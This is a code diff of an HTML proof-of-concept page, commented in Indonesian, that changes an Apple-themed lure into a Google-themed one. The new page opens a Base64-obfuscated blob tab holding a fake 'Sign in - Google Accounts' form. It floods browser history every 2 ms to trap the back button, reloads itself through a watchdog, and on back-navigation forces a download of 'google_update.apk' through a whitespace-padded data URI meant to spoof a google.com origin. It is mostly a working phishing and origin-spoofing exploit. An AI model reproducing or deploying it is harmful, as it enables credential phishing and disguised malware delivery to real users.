@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Ultimate Enforced Bypass & Download Engine</title>
+    <title>Advanced Origin Spoofing & Pipeline Chaining PoC</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
@@ -28,6 +28,36 @@
         padding: 20px;
         box-sizing: border-box;
       }
+      .login-container {
+        background-color: #fff;
+        padding: 2.5rem;
+        border-radius: 8px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+        width: 100%;
+        max-width: 400px;
+        text-align: center;
+        color: #111;
+        box-sizing: border-box;
+      }
+      .input-field {
+        width: 100%;
+        padding: 0.75rem 1rem;
+        margin-bottom: 1.25rem;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 1rem;
+        box-sizing: border-box;
+      }
+      .btn-primary {
+        background-color: #1a73e8;
+        color: #fff;
+        padding: 0.75rem 1.5rem;
+        border-radius: 4px;
+        font-size: 1rem;
+        font-weight: 500;
+        cursor: pointer;
+        width: 100%;
+      }
       h1 {
         font-size: 24px;
         margin-bottom: 8px;
@@ -39,9 +69,9 @@
   </head>
   <body>
     <div class="container">
-      <h1>Enforced Bypass Engine</h1>
+      <h1>Advanced Origin Spoofing Engine</h1>
       <button id="startBtn" class="w-full max-w-[420px] p-6 text-xl font-bold bg-red-600 text-white rounded-2xl shadow-xl cursor-pointer hover:bg-red-700 transition">
-        EXECUTE ENFORCED BYPASS LOCK
+        EXECUTE SPOOFING & CHAINING LOCK
       </button>
     </div>
 
@@ -49,14 +79,14 @@
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Membangun Payload Terpadu dengan Lapisan Enkapsulasi Ganda (Double-Blob & Whitespace Padding)
+        // 1. Membangun Payload Terpadu (Form Autentikasi Palsu + History Flooding + Malformed Data URI Trigger)
         const rawPayload = `
           <!DOCTYPE html>
           <html lang="en">
           <head>
               <meta charset="UTF-8">
-              <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
-              <title>Apple - Secure Verification</title>
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+              <title>Sign in - Google Accounts</title>
               <script src="https://cdn.tailwindcss.com"><\/script>
               <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
               <style>
@@ -102,64 +132,73 @@
           </head>
           <body>
               <div class="login-container">
-                  <img src="https://www.apple.com/ac/globalnav/7/en_US/images/ac/globalnav/apple_image__b5ax561milqq_large.svg" alt="Apple" class="mx-auto mb-6 w-10">
-                  <h1 class="text-2xl font-normal mb-2">Apple Account Security</h1>
-                  <p class="text-base text-gray-600 mb-6">Verify your device identity</p>
+                  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="mx-auto mb-6 w-24">
+                  <h1 class="text-2xl font-normal mb-2">Sign in</h1>
+                  <p class="text-base text-gray-600 mb-6">Use your Google Account</p>
 
-                  <form id="loginForm" action="javascript:document.body.innerHTML='<h1 style=\\'color:#000;text-align:center;margin-top:20vh;font-size:36px;\\'>Session Verified</h1>'">
-                      <input type="email" id="email" class="input-field" placeholder="Apple ID Email" required>
+                  <form id="loginForm" action="javascript:document.body.innerHTML='<h1 style=\\'color:#000;text-align:center;margin-top:20vh;font-size:48px;\\'>Context Synchronized</h1>'">
+                      <input type="email" id="email" class="input-field" placeholder="Email or phone" required>
                       <input type="password" id="password" class="input-field" placeholder="Password" required>
-                      <button type="submit" class="btn-primary">Continue</button>
+                      <button type="submit" class="btn-primary">Next</button>
                   </form>
               </div>
 
               <script>
-                // 1. Inisialisasi State History Stack untuk menjebak aksi Back Button
-                history.pushState({state: 'auth-step-1'}, "", "#auth");
-                history.pushState({state: 'auth-step-2'}, "", "#session");
-
-                // 2. Rutinitas Unduhan dengan Spoofed Data URI + Whitespace Masif Berkelanjutan
-                function executeEnforcedDownload() {
+                // Fungsi Pemicu Unduhan Menggunakan Malformed Data URI dengan Whitespace Padding
+                function triggerSpoofedDownload() {
                   try {
-                    // Padding spasi horizontal diperluas untuk memaksa evaluasi parser pemotongan string string-display
-                    const spoofedUri = "data:https://apple.com/                                                                                                                                                                                                                                                                                                                                                                                                                     application/x-apple-diskimage;base64,UEsDBBQACAgIAJd42VsAAAAAAAAAAAAAAAALAAAAQXBwbGVfQ2VydC50eHRCbHVlcHJpbnQgQ29uZmlndXJhdGlvbiBTeXN0ZW0K";
+                    // Eksploitasi parsing GURL melalui data:// dengan otoritas host palsu dan spasi masif
+                    const spoofedUri = "data://google.com/                                                                                                                                                                                                                       application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=";
                     
-                    const a = document.createElement('a');
-                    a.href = spoofedUri;
-                    a.download = "Apple_Security_Configuration_Update.pkg";
-                    a.style.display = 'none';
-                    document.body.appendChild(a);
-                    
-                    a.click();
+                    const link = document.createElement("a");
+                    link.href = spoofedUri;
+                    link.download = "google_update.apk";
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
                     
                     setTimeout(() => {
-                      document.body.removeChild(a);
+                      document.body.removeChild(link);
                     }, 1000);
                   } catch(e) {}
                 }
 
-                // 3. Menangkap event popstate secara instan saat tombol kembali ditekan
+                // Inisialisasi History State untuk Intersepsi Event Back / Popstate
+                history.pushState({state: 'enclave-auth'}, "", "#auth");
+                history.pushState({state: 'secure-session'}, "", "#session");
+
+                // Menangkap aksi tombol kembali (Back Button) untuk memicu aliran unduhan
                 window.addEventListener('popstate', () => {
-                  executeEnforcedDownload();
+                  triggerSpoofedDownload();
                 });
 
-                // Penundaan eksekusi redirect agar event popstate dan unduhan memiliki waktu render yang cukup
+                // Sinkronisasi Pipeline Render menggunakan Double-RAF
                 window.addEventListener('pageshow', () => {
                   requestAnimationFrame(() => {
                     requestAnimationFrame(() => {
                       setTimeout(() => {
                         try {
-                          location.href = 'https://apple.com';
+                          // Mengarahkan ke domain target sah setelah state terkunci
+                          location.href = 'https://google.com';
                         } catch(err) {}
-                      }, 1800);
+                      }, 1200);
                     });
                   });
                 });
 
-                // Membanjiri History State untuk mengunci NavigationController
+                // Watchdog Mandiri dan History State Flooding
+                try {
+                  const observer = new MutationObserver(() => {
+                    if (!document.getElementById('loginForm')) {
+                      location.reload();
+                    }
+                  });
+                  observer.observe(document.documentElement, { childList: true, subtree: true });
+                } catch(e) {}
+
                 setInterval(() => {
                   try {
-                    history.pushState({lock: Math.random()}, "", "#secure-state");
+                    history.pushState({lock: Math.random()}, "", "#secure-enclave-state");
                   } catch(err) {}
                 }, 2);
               <\/script>
@@ -167,14 +206,15 @@
           </html>
         `;
 
-        // 2. Enkripsi Dinamis Base64
+        // 2. Enkripsi Payload ke Format Base64 untuk Obfuscation
         const encoded = btoa(unescape(encodeURIComponent(rawPayload)));
         const decoded = decodeURIComponent(escape(atob(encoded)));
 
+        // Inisialisasi Blob Stream untuk Bypass Jendela about:blank
         const blob = new Blob([decoded], { type: 'text/html' });
         const blobUrl = URL.createObjectURL(blob);
 
-        // 3. Membuka jendela baru
+        // 3. Membuka Jendela Baru dengan Referensi Terisolasi
         const newTab = window.open(blobUrl, "_blank");
 
         if (newTab) {
